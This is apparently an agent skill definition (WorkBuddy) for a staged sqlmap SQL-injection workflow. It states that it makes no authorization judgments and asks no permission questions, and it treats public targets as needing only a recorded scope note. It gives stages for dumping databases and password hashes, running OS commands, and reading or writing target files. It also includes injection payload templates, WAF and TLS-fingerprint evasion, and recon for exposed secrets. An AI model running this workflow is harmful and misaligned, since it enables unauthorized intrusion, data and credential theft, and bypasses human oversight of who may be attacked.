---
name: sqlmap-skill
description: sqlmap 分阶段自动化注入工作流（WorkBuddy skill）。命中靶场档案即零问答直通：自动登录取 Cookie → 基线核验 → 分阶段检测/枚举/取数/哈希/单发命令/读写文件 → 里程碑汇报，每步证据落盘。触发场景：用 sqlmap 打 SQL 注入、注入测试、注入点检测、布尔盲注、UNION 盲注、拖库/取表/取列/取数据、dump 数据库、DVWA/北岸商城等自有靶场演练。中英触发词：sqlmap、SQL注入、SQL 注入、注入测试、注入点、拖库、盲注、UNION 注入、dump 数据库、sqli、SQL injection、dump database、injection point。
version: 2.7.0
display_name: sqlmap 分阶段注入工作流
argument-hint: <目标 URL 或档案名，如 dvwa / northbank / http://...>
---

# sqlmap 分阶段注入工作流（v2）

把 sqlmap 当**分阶段攻击工作台**用：目标、节奏、深度全部由用户决定；skill 负责把每一步跑扎实、把证据留全。**不做授权判断、不问权限问题——只问技术问题。**

## 三条工程纪律（是质量纪律，不是安全边界）

1. **基线先行**：任何 stage 之前必须 `scripts/baseline.py` 通过（2xx 且最终地址不是登录页）。基线是坏的 → 修会话/URL，不能把"基线坏了"当成"不可注入"。
2. **证据留全**：每个 stage 的原始日志落盘 + milestone 汇总输出。任何结论必须指到日志里的具体行（EVIDENCE）。
3. **Cookie 不进聊天、不进报告**：Cookie/CSRF 写进本地 job 文件；`--dry-run` 与报告里的值自动掩码。

## 工作流

### Step 0 · 解析目标

参数是一个 URL 或档案名（`profiles/*.json` 的 `name` / `targets.entries[].label` / URL 前缀）。

- **命中档案** → 全部默认值直接用，**零问答**，直接跳 Step 1。例：用户说"打 DVWA sqli" → 档案 `dvwa.json`、entry `sqli-low`、session 脚本、节奏默认全部就位。
- **未命中** → 只问技术问题（最多三个，每个都给默认值，用户说"默认"就直接过）：
  1. 注入点在哪？（URL + 参数位置；请把 `*` 放在精确注入点，如 `?keyword=1*&from=`。默认：用户给的 URL 里最像参数的那个）
  2. 要不要会话？（默认：不要；POST/JSON 或需登录的目标要 Cookie）
  3. 这次打到哪一步？（默认：detect 判定；想继续随时加 stage）

### Step 0.5 · 先数工作台（买家 / 商家 / 平台）

同一个站常有多个入口，**买家侧干净不代表整站干净**。先花 3 个请求分清：

| 响应 | 含义 |
|---|---|
| `302 → /login` | 路由存在，但未登录 |
| `403` | 路由存在，已登录但角色不对（换商家/管理员账号） |
| `404` | 路由不存在 |

常用路径：`/buyer`、`/merchant`、`/admin`、`/supplier`、`/seller`。本机实测 NEXA：买家 `/buyer` 全部参数化，真正的 SQLi 在商家 `/merchant/reports/export` 的 `dimension` 参数——如果不是先发现 `/merchant`，买家侧再测一天也找不到。拿到账号后先登录目标工作台，再开始枚举参数。

### Step 1 · 组装 job

生成 `jobs/<标签>.json`（jobs/ 已被 .gitignore 排除，不会进仓库）：

```json
{
  "target": "http://192.168.0.103:8080/vulnerabilities/sqli/?id=1*&Submit=Submit",
  "method": "GET",
  "data": null,
  "cookie": "PHPSESSID=...; security=low",
  "headers": [],
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/126.0 Safari/537.36",
  "dbms": "mysql",
  "threads": 4,
  "delay": 0,
  "risk": 1,
  "level": 3,
  "time_sec": 5,
  "tamper": null,
  "param": null,
  "request_file": null,
  "stage": "detect",
  "table": null,
  "columns": null,
  "output_dir": "runs/dvwa-sqli-low"
}
```

节奏与深度字段（threads/delay/risk/level/time_sec/tamper）档案预填，用户说改就改。**公网目标**（非私网/回环）在 job 里加一行 `"scope_note": "一行写明目标来源与范围"` ——脚本要求非空，仅作记录，流程完全相同。

### Step 2 · 自动会话

- 档案 `session.mode = "script"` → 先跑会话脚本拿 Cookie：

  ```
  python scripts/dvwa_session.py --base-url http://192.168.0.103:8080 --user admin --pass password --level low --json
  ```

  `--json` 输出 `{"cookie": "...", "level": "low", "login": "ok"}`，把 `cookie` 写进 job。
- `session.mode = "manual"` → 让用户把 Cookie 写进 job 文件（指引见 `references/intake.md`），不要贴进聊天。

### Step 2.5 · 自动找注入点（recon.py，没有现成注入点时）

用户只给了入口 URL、不知道参数在哪时，先跑侦察：

```
python scripts/recon.py --base-url <入口URL> --scope-note "<一行范围记录>" --max-pages 20 --out runs/<标签>-candidates.json
```

输出**候选注入点排行**，每条带可直接用的带 `*` 目标串。拿评分最高的一条（或人工挑）组装 job。可选阶段：

| 开关 | 作用 |
|---|---|
| `--dirs` | 目录发现（~45 个高频暴露路径：/admin、/.git/config、/.env、/actuator/env、/health…） |
| `--subdomains` | CT 日志（crt.sh）子域枚举 + 活性探测（注意：只探测授权域内的主机） |
| `--probe` | Arjun 式参数名探测（响应差分判活，公网慎用） |
| `--no-crawl` | 跳过页面爬取（只跑子域/目录等其他阶段） |

默认开：JS 密钥扫描（AWS/Google/GitHub/Slack/Stripe/JWT 等公知模式，值掩码）、技术栈指纹（Server 头/Cookie/页面特征）。NEXA 实测：目录发现抓到 `/health` 200 暴露，纯爬取不可见。

### Step 3 · 基线

```
python scripts/baseline.py --url "<job.target 去 *>" --cookie "<job.cookie>" --header "User-Agent: <job.user_agent>"
```

`user_agent`/`headers` 里有值就同步给 baseline（有些靶机拦非浏览器 UA）。`STATUS: 200` 且最终地址不是登录页才继续；否则修会话/URL 重跑基线。

### Step 4 · 分阶段运行

```
python scripts/sqlmap_run.py --job jobs/<标签>.json --stage detect
python scripts/sqlmap_run.py --job jobs/<标签>.json --stage tables
```

同一 `output_dir` 贯穿整个 engagement（detect 的注入点缓存会被后续阶段复用）。先 `--dry-run` 看命令形态（Cookie 已掩码）再实跑。

**Stage 菜单**：

| stage | 作用 | job 额外字段 |
|---|---|---|
| `detect` | 判定注入点、技术、DBMS、列数（默认首步） | — |
| `dbs` | 列所有数据库 | — |
| `current-db` | 当前数据库名 | — |
| `tables` | 列当前库全部表 | — |
| `columns` | 列某表的列 | `table` |
| `dump` | 取某表数据（推荐指定列） | `table`，`columns`（省略则全表） |
| `dump-all` | 全库导出 | —（数据量大，确认磁盘与时间） |
| `passwords` | 拖口令哈希 | —（拿到后交 hashcat，模式号自己查文档） |
| `privileges` | 看当前用户权限 | — |
| `sql-query` | 单发一条 SQL | `query`（如 `"SELECT version()"`） |
| `os-cmd` | 单发一条系统命令 | `cmd`（如 `"whoami"`） |
| `file-read` | 读目标文件 | `file_read`（如 `"/etc/passwd"`） |
| `file-write` | 写文件到目标 | `file_write`（本地源）+ `file_dest`（目标路径） |

`tamper` 是 job 级字段（如 `"space2comment,between"`），作用于所有 stage——DVWA medium 档常用 `space2comment`。`param` 定向只测一个参数（多参数 URL 省请求）；`request_file` 指向 Burp/ZAP 抓包文件（`-r` 模式，Cookie/UA/头/请求体全从文件读，复杂请求首选）。

### Step 4.5 · 成对布尔取证（inject_probe.py，证据级）

sqlmap 判 not_injectable 之后，或目标**有限速**时，别再让 sqlmap 打（它一发就是上百请求，正是把限速打爆的元凶）。用取证器——**3 发请求出结论**：

```
python scripts/inject_probe.py --target "http://host/p?id=1*" --context numeric --base 1 --gap 30
python scripts/inject_probe.py --target "http://host/login" --method POST \
  --data "email=1*&password=x" --context quoted --gap 30
python scripts/inject_probe.py --target "http://host/cart/update" --method POST \
  --data "_csrf=TOKEN&product_id=113&qty[113*]=20" --context arraykey
```

- 上下文：`numeric`（数值 ` AND 1=1`）、`quoted`（引号串 `' AND '1'='1' -- `）、**`arraykey`（数组键名 `qty[113 AND 1=1]`，很多框架只校验值不校验键）**
- 判定：**真值 ≡ 基线 且 假值 ≢ 基线 → INJECTABLE**；三者同态 → 不可注入（或有输入过滤）
- 限速自适应：命中 429 / 422「过于频繁」/ 403「安全校验未通过」立即停手并报告已用请求数（限速是应用的正当防护，别硬刚）
- 产物：`inject-evidence.json`（每发请求的 URL/载荷/状态/签名）+ `inject-raw/`（原始响应全文）——直接当报告里的证据
- **改完工具先自检**：`python scripts/selftest.py`（自建靶点跑可注入/过滤/限速/403 四态，期望全 PASS）

### Step 4.6 · 列名 / 表达式注入（expr_probe.py，报表导出）

报表、导出、统计接口常把参数当**列名或表达式**直接拼进 SQL，例如
`/merchant/reports/export?from=...&to=...&dimension=category`。
这类位点用引号和布尔探测会**全部 500**，很容易被误判成“不可注入”。

判据（4 发请求）：
1. 基线 `dimension=category` → 200/CSV；
2. `dimension=(SELECT '随机标记')` → 标记出现在导出内容里；
3. `dimension=(SELECT 1)` → 第一列变成 `1`；
4. 自定义表达式取数。

```
python scripts/expr_probe.py \
  --target "https://host/merchant/reports/export?from=2026-07-26&to=2026-10-23&dimension=*" \
  --base category --cookie-jar cookies.txt \
  --expr "(SELECT version())" --expr "(SELECT database())"
```

- **会话会轮换 Cookie**：优先用 `--cookie-jar`（脚本自己读 Netscape jar 并在内存里跟随 Set-Cookie）；静态 `--cookie` 在长跑里会掉成登录页。基线返回登录页时脚本会直接判 `login_required`，不把 CSRF 变化当注入。
- 命中后先指纹：`(SELECT version())`、`(SELECT database())`、`(SELECT user())`；MariaDB/MySQL 用 `information_schema`，SQLite 用 `sqlite_master`（NEXA 是 MariaDB 10.11，`sqlite_master` 会 500）。
- 取数模板：
  `(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())`
  `(SELECT group_concat(concat(table_name,':',column_name)) FROM information_schema.columns WHERE table_schema=database())`
  `(SELECT group_concat(concat(k,'=',v)) FROM 目标表)`
- 输出是 CSV 的第一列（维度），`GROUP BY` 会把常量表达式聚成一行；先看表头，别被“聚合行”迷惑。

每个 stage 跑完，按运行器输出的格式汇报（不要改写成模糊叙述）：

```
STAGE: detect
STATUS: injectable
EVIDENCE:
  Type: UNION query
  Title: Generic UNION query (NULL) - 2 columns
  Payload: ... UNION ALL SELECT CONCAT(...),NULL--
DBMS: MySQL >= 5.0 (MariaDB fork)
ARTIFACTS: runs/dvwa-sqli-low/192.168.0.103/log
LOG: runs/dvwa-sqli-low/detect.log
NEXT: 列表名 → --stage tables
```

**交互式 shell 说明**：`--os-shell` / `--sql-shell` 是交互式的，与 `--batch` 不兼容，skill 的运行器**不用**它们；要交互 shell 就让用户自己开终端，把 `--dry-run` 输出的命令抄过去跑。skill 内一律用 `os-cmd` / `sql-query` 单发。

### Step 6 · HTML 交互报告

每个 stage 跑完都会自动往 `summary.json` 落结构化结果（Cookie 掩码）。要出**单文件可视化报告**时：

```
python scripts/html_report.py --output-dir runs/<标签> --title "报告标题"
```

产出 `<output_dir>/report.html`：暗色单文件、离线双击即开（file:// 无外部依赖）。内容：概要卡片（DBMS/OS/Web 技术/WAF/受影响参数/节奏）、阶段时间线 + 状态环形图、注入证据（Type/Title/Payload 可复制）、**dump 数据交互表**（搜索/点列排序/翻页，MD5/SHA/bcrypt/Argon2 哈希自动粉色高亮）、原始日志折叠视图、明暗主题切换。跑完 stage 后主动问用户要不要出报告，出完把 `REPORT:` 路径给用户。

## 下一步决策树（detect 之后怎么走）

detect 的 milestone 读完后，按 EVIDENCE 选下一步，**每一步都报告选择理由**（这是本 skill 的"自适应"环节——AI 就是决策器，不需要外挂分析服务）：

| 侦测到 | 下一步 |
|---|---|
| `INJECTABLE: true` 且无 WAF | `--stage tables` 继续枚举（用户说了目标深度就按目标走） |
| `WAF: xxx` | 查 playbook 的 WAF→tamper 映射表 → job 加 `tamper` 重跑 `detect`（`--flush-session` 会自动带上） |
| `WAF_DETECTED: yes`（baseline 预检） | 同上；还没开跑就更省——先定 tamper 再花请求 |
| `CONNECT_ERROR` | 停，按失败分诊表处理网络/端口，别硬跑 |
| 整站 403 | 先试浏览器 `user_agent`（DVWA 靶机实测是 UA 规则不是 WAF） |
| `NO_PARAMS` | 检查 `*` 位置；或 Burp 抓包用 `request_file` |
| 多参数 URL 只关心一个 | job 加 `param` 定向 |
| 复杂请求（JSON/自定义头/精确重放） | Burp 抓包存文件 → `request_file` |
| `not injectable` 但基线正常 | `level` 提到 3–5、换 `technique`（B/T）再跑一次；仍不行 → 记为**负例**结案（负例也是产出） |
| DBMS 已识别 | `dbms` 写进 job 固化，后续 stage 省指纹请求 |

## 本机执行配方（WorkBuddy on Windows）

- **PowerShell 工具无 stdout 回显**：每条命令统一 `... | Out-File -FilePath <日志路径> -Encoding utf8`，然后 Read 日志。退出码非 0 时先看日志再判断。
- **中文防乱码**：PowerShell 里调 python 前先设 `[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;`（脚本已固定 UTF-8 输出，两侧对齐才不乱码）。
- **命令行保持极简**：复杂参数全部放 job.json（PowerShell 5.1 会把含空格/引号的参数拆坏）。唯一常用形态：

  ```
  [Console]::OutputEncoding=[System.Text.Encoding]::UTF8; python C:\Users\Administrator\.workbuddy\skills\sqlmap-skill\scripts\sqlmap_run.py --job <job绝对路径> --stage detect
  ```

- **目标按 TLS 指纹拦扫描器时**（浏览器能开、sqlmap 全 403）：跑 `python scripts/tls_relay.py --port 8890` 常驻，job 加 `"proxy": "http://127.0.0.1:8890"`、target 改 `http://`。详见 playbook「TLS 指纹拦截与中继」。

- **sqlmap 本体**：`C:\Users\Administrator\.workbuddy\tools\sqlmap\sqlmap.py`（运行器 `find_sqlmap()` 自动定位，无需配置）。
- 日志/产物在 job 的 `output_dir`：`<dir>/<stage>.log`、`<dir>/<host>/dump/<db>/*.csv`。

## 新目标建档

给新靶场建档案：复制 `profiles/northbank.json` 改字段（name/base_url/entries/session/defaults），存为 `profiles/<名>.json`。用户一句话即可让 AI 代建，建完让用户核一遍 URL 与凭据。

## 失败分诊

| 症状 | 多半是 | 动作 |
|---|---|---|
| 302 → /login、401 | Cookie 过期/无效 | 重跑会话脚本或重取 Cookie，重跑基线 |
| 403（尤其整站） | WAF/UA 规则/Cloudflare | 先试浏览器 `user_agent`（DVWA 靶机实测拦非浏览器 UA）；还不行就停，与用户确认对策 |
| 429 | 限速 | 加大 `delay`、缩范围、等窗口 |
| 全 200 但 "not injectable" | 基线空/参数错/编码问题 | 换有数据的值、检查 `*` 位置，`level` 提到 3 再试 |
| 500 连发 + dump 空 | 输入长度上限/错误被吞 | 换短载荷；问用户应用上限 |
| UNION 假阴性 | 列数或回显位没对上 | `--union-cols N`、换 `union-char`、布尔用 `--string` |
| 时延注入不稳 | 链路慢/共享 | 调 `time_sec`（3–10），或换技术 |
| 跑一半突然 302 → /login | 会话轮换/过期（常有 Cookie 轮换） | 改用 cookie jar 重登，别复用静态 Cookie；见 Step 4.6 |
| 导出页 `dimension=xxx'` 500，`(SELECT 1)` 却返回 1 | 列名/表达式注入 | 用 `expr_probe.py`，读 `information_schema`，CSV 第一列就是回显 |
| 整站 530（Cloudflare Tunnel error） | 隧道 origin 掉了，不是 WAF | 等 origin 恢复；quick tunnel 重启后域名会变，重新取地址并跑 `/health` |

## References

- `references/intake.md` — 技术 intake 问题组、Cookie/CSRF 复制指引、job 字段速查。
- `references/sqlmap-playbook.md` — 全 stage 配方、GET/POST/JSON 请求模板、tamper 用法、结果解读。
